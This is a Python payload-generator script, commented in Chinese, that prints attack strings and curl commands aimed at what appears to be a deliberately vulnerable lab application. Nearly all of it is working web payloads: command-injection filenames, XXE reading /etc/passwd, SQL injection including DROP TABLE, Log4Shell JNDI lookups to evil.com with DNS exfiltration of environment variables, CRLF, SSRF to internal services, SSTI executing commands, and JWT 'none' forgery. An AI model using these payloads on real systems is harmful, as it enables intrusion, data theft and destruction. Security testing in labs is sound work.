#!/usr/bin/env python3
"""
Payload 生成器 - 用于生成各类漏洞测试 Payload

使用方法:
    python3 generate_payloads.py --type cmd --payload "whoami"
    python3 generate_payloads.py --type xxe --file "/etc/passwd"
    python3 generate_payloads.py --type log4j --mode "dns"
"""

import argparse
import urllib.parse
import json
import base64

class PayloadGenerator:
    """漏洞 Payload 生成器"""

    @staticmethod
    def command_injection(command):
        """生成命令注入 Payload"""
        payloads = {
            'unix_semicolon': f'test.txt;{command}',
            'unix_pipe': f'test.txt|{command}',
            'unix_and': f'test.txt&&{command}',
            'unix_or': f'test.txt||{command}',
            'unix_backtick': f'test.txt`{command}`',
            'unix_dollar': f'test.txt$(echo {command})',
            'windows_pipe': f'test.txt|{command}',
            'windows_and': f'test.txt&&{command}',
        }
        return payloads

    @staticmethod
    def xxe_payload(file_path, ssrf_url=None):
        """生成 XXE Payload"""
        if file_path:
            entity = f'<!ENTITY xxe SYSTEM "file://{file_path}">'
        elif ssrf_url:
            entity = f'<!ENTITY xxe SYSTEM "{ssrf_url}">'
        else:
            entity = '<!ENTITY xxe SYSTEM "file:///etc/passwd">'

        payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  {entity}
]>
<root>&xxe;</root>'''
        return payload

    @staticmethod
    def sqli_payloads():
        """生成 SQL 注入 Payload"""
        return {
            'basic_or': "admin' OR '1'='1",
            'basic_union': "admin' UNION SELECT NULL,NULL,NULL--",
            'boolean_based': "admin' AND 1=1--",
            'time_based': "admin' AND SLEEP(5)--",
            'stacked': "admin'; DROP TABLE users--",
            'like_injection': "admin%' OR '1'='1",
        }

    @staticmethod
    def log4j_payloads(dns_log_domain=None):
        """生成 Log4Shell Payload"""
        if dns_log_domain:
            return {
                'dns': f"${{jndi:ldap://{dns_log_domain}/exp}}",
                'env_dns': f"${{jndi:ldap://${{env:USER}}.{dns_log_domain}/exp}}",
            }
        return {
            'env_leak': "${env:USER}",
            'sys_prop': "${sys:java.version}",
            'env_path': "${env:PATH}",
            'jndi_ldap': "${jndi:ldap://evil.com:1389/Exploit}",
            'jndi_rmi': "${jndi:rmi://evil.com:1099/Exploit}",
            'bypass_lower': "${${lower:j}ndi:ldap://evil.com/exp}",
            'bypass_upper': "${${upper:j}ndi:ldap://evil.com/exp}",
        }

    @staticmethod
    def crlf_payloads():
        """生成 CRLF 注入 Payload"""
        return {
            'set_cookie': "admin%0d%0aSet-Cookie:%20admin=true",
            'redirect': "admin%0d%0aLocation:%20http://evil.com",
            'xss': "admin%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>",
        }

    @staticmethod
    def ssrf_payloads():
        """生成 SSRF Payload"""
        return {
            'file_passwd': "file:///etc/passwd",
            'file_hosts': "file:///etc/hosts",
            'file_etc': "file:///etc/",
            'http_localhost': "http://127.0.0.1:8080",
            'http_internal': "http://192.168.1.1",
            'dict_sphinx': "dict://127.0.0.1:11211",
            'gopher': "gopher://127.0.0.1:6379/_INFO",
        }

    @staticmethod
    def ssti_payloads():
        """生成 SSTI Payload"""
        return {
            'velocity_basic': '$math',
            'velocity_class': '$scope',
            'velocity_exec': '#set($x="")$x.class.forName("java.lang.Runtime")',
            'freemarker_api': '"test"?api',
            'freemarker_classloader': '${"test"?api.class.getClassLoader()}',
            'freemarker_exec': '<#assign ex="java.lang.Runtime"?new()>${ex.exec("whoami")}',
        }

    @staticmethod
    def jwt_payloads():
        """生成 JWT 测试 Payload"""
        return {
            'none_header': '{"alg":"none","typ":"JWT"}',
            'none_payload': '{"sub":"admin","role":"administrator"}',
            'weak_keys': ['secret', 'password', 'admin123', 'mySecretKey'],
        }

def print_curl_command(method, url, headers=None, data=None):
    """打印 curl 命令"""
    cmd = f"curl -X {method} '{url}'"
    if headers:
        for k, v in headers.items():
            cmd += f" -H '{k}: {v}'"
    if data:
        cmd += f" -d '{data}'"
    print(f"  命令: {cmd}")

def main():
    parser = argparse.ArgumentParser(description='漏洞 Payload 生成器')
    parser.add_argument('--type', required=True,
                        choices=['cmd', 'xxe', 'sqli', 'log4j', 'crlf', 'ssrf', 'ssti', 'jwt'],
                        help='Payload 类型')
    parser.add_argument('--target', default='http://localhost:8080', help='目标 URL')
    parser.add_argument('--command', help='命令注入的命令')
    parser.add_argument('--file', help='XXE 文件路径')
    parser.add_argument('--dns-domain', help='DNS 外带域名')

    args = parser.parse_args()
    gen = PayloadGenerator()

    print(f"\n{'='*60}")
    print(f"  {args.type.upper()} Payload 生成")
    print(f"{'='*60}\n")

    if args.type == 'cmd':
        payloads = gen.command_injection(args.command or 'whoami')
        for name, payload in payloads.items():
            print(f"\n[{name}]")
            encoded = urllib.parse.quote(payload)
            print(f"  Payload: {payload}")
            print(f"  URL 编码: {encoded}")
            print(f"  curl: curl '{args.target}/cmd/runtime/vuln?filename={encoded}'")

    elif args.type == 'xxe':
        payload = gen.xxe_payload(args.file)
        print(f"  XXE Payload:")
        print(payload)
        print(f"\n  curl 命令:")
        print_curl_command(
            'POST',
            f"{args.target}/xxe/saxBuilder/vuln",
            {'Content-Type': 'application/xml'},
            payload.replace('\n', ' ')
        )

    elif args.type == 'sqli':
        payloads = gen.sqli_payloads()
        for name, payload in payloads.items():
            print(f"\n[{name}]")
            print(f"  Payload: {payload}")
            encoded = urllib.parse.quote(payload)
            print(f"  curl: curl '{args.target}/sqli/like/vuln?username={encoded}'")

    elif args.type == 'log4j':
        payloads = gen.log4j_payloads(args.dns_domain)
        for name, payload in payloads.items():
            print(f"\n[{name}]")
            print(f"  Payload: {payload}")
            encoded = urllib.parse.quote(payload)
            print(f"  curl: curl '{args.target}/log4j/vuln?token={encoded}'")

    elif args.type == 'ssrf':
        payloads = gen.ssrf_payloads()
        for name, payload in payloads.items():
            print(f"\n[{name}]")
            print(f"  Payload: {payload}")
            print(f"  curl: curl '{args.target}/ssrf/urlconnection/vuln?url={payload}'")

    elif args.type == 'ssti':
        payloads = gen.ssti_payloads()
        for name, payload in payloads.items():
            print(f"\n[{name}]")
            print(f"  Payload: {payload}")
            encoded = urllib.parse.quote(payload)
            print(f"  curl: curl '{args.target}/ssti/velocity/vuln?template={encoded}'")

    print(f"\n{'='*60}\n")

if __name__ == '__main__':
    main()
